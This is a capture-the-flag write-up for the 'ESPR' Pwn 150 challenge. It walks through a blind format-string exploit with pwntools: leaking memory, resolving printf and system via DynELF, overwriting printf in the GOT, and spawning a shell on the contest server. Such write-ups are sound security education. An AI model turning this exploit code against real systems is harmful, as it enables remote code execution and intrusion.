# Pwn 150 - ESPR

> Writeup by [f0xtr0t](https://twitter.com/@jay_f0xtr0t) (Jay Bosamiya)

This challenge was solved after the contest, by f0xtr0t (Jay Bosamiya) and p4n74 (Rakholiya Jenish)

It was a great challenge with quite a bit to learn, especially since we didn't have the binary, but only a vulnerability to work from.

## The challenge

![](espr_small.jpg)
> nc 78.46.224.86 1337

Note by f0xtr0t: If the server is not available at some point, you can set it up on your own system using [`leaked_from_server.tar.gz`](leaked_from_server.tar.gz). These files were obtained after solving the challenge, and if you are using them, solve them without using any info from the files. Only the above image and access to the `nc` server was available during the contest, and the below solution uses only these.

## The solution

The complete solution is in [`espr.py`](espr.py). Below is the complete explanation.

Import the almighty pwntools, and open a connection to the server. Based upon the image, we know it is an `amd64` binary, and we can guess it is running on linux.

```python
from pwn import *

conn = remote('78.46.224.86', 1337)

context.update(arch='amd64', os='linux')


```

Looking at the image, we know that it is a format string vulnerability. As a way of abstracting the payload string, we write an `exec_payload`, which prepends a tag (`P0WN`), and uses it as a way of ensuring cleaner execution. `'\n'`s cause us problems and so we just ignore any payloads with this in it.

```python
def exec_payload(payload):
    if '\n' in payload:
        return ""
    conn.sendline("P0WN" + payload)
    conn.recvuntil("P0WN")
    data = conn.recvrepeat(0.5)
    log.info("%s => %s" % (repr(payload), repr(data)))
    return data
```

Using the `print_stack` function, I got information about what's on the stack. By seeing what's on the stack, we could get an idea of where to go further. Turns out, at offset 30, we get an address that looks like it is in the part of the binary (due to 0x4000000-like address). We store this to be of use later with `DynELF` from pwntools.

```python
def print_stack(until):
    for i in xrange(1, until + 1):
        exec_payload('%' + str(i) + '$p')

addr_into_bin = int(exec_payload('%30$p'), 16)
log.info('Using address %s' % hex(addr_into_bin))
```

Now, using the format string vulnerability, we try to find out a point that refers to itself so that we can leak using it. With this, we define a `leak` function, which leaks data from the given address. It leaks an indefinite amount of data (as much as it can). Minor workarounds are introduced to handle `'\n'` in the address which can be tried to be leaked by looking at previous address or similar.

```python
def find_leak_point():
    for i in xrange(1, 200):
        r = exec_payload('%' + str(i) + '$p' + 'XXXXXXXX' + 'YYYYYYYY')
        if '0x5959595959595959' in r:
            return i

leak_point = find_leak_point()
log.info('Found leak point %d' % leak_point)

def leak(addr):
    addr &= (2**64 - 1)
    log.info('Leaking address %s' % hex(addr))
    r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'
```

Now, using the `leak` function and the address into the binary that we had found before, we instantiate pwntool's DynELF. We use this to find the address of the dynamic section, and a couple of addresses (`printf` and `system`) that we will use later. Our current plan of attack is to overwrite the `printf` address in the GOT with the address to `system`, and then pass in a `/bin/sh` to gain access to a shell. The DynELF lookups take a lot of time, due to the `sleep` that's there on the system. However, due to the way memory leakers are handled, any addresses walked over once will automatically be used again rather than make more calls to the server. So our next parts should run quick enough.

```python
d = DynELF(leak, addr_into_bin)

dynamic_addr = d.dynamic

printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')
```

Parsing the dynamic section, we want to get the address to the PLTGOT, which is identified by the type 0x03. We thus skip over values in the dynamic section until we get the right type and then return that address.

```python
def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # type PLTGOT
            addr += 8
            return u64(d.leak.n(addr, 8))
        addr += 0x10

got_addr = find_plt_got()
log.info('GOT Address: %s' % hex(got_addr))
```

We now can walk over the GOT to find the actual address where `printf` is stored.

```python
def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p64(printf_addr):
            return addr
        addr += 8

printf_got = find_printf()
log.info('printf@got : %s' % hex(printf_got))
```

With all these addresses found, we just need to generate a format string that does the correct overwrite. We could use `fmtstr` from pwntools, but it would involve some other minor complications (since it places the addresses before doing the format specifiers, but for our use case, we need to have all the format specifiers before the addresses which contain nulls). Hence, we write our own custom format string generator. The `curout = 4` is there because of the `P0WN` tag that we add.

```python
def fmt_gen(addr, val):
    ret = ''
    curout = 4
    dist_to_addr = 12 + 8*20
    reader = (dist_to_addr / 8) + 7
    for i in range(8):
        diff = (val & 0xff) - curout
        curout = (val & 0xff)
        val /= 0x100
        if diff < 20:
            diff += 0x100
        ret += '%0' + str(diff) + 'u'
        ret += '%' + str(reader) + '$hhn'
        reader += 1
    assert(len(ret) < dist_to_addr)
    ret += 'A'*(dist_to_addr - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret
```

Finally, we run the exploit, and drop a shell.

```python
log.info("Running exploit")
exec_payload(fmt_gen(printf_got, system_addr))
conn.sendline('/bin/sh')
log.info("Opened shell")
conn.interactive()

conn.close()
```

Success!
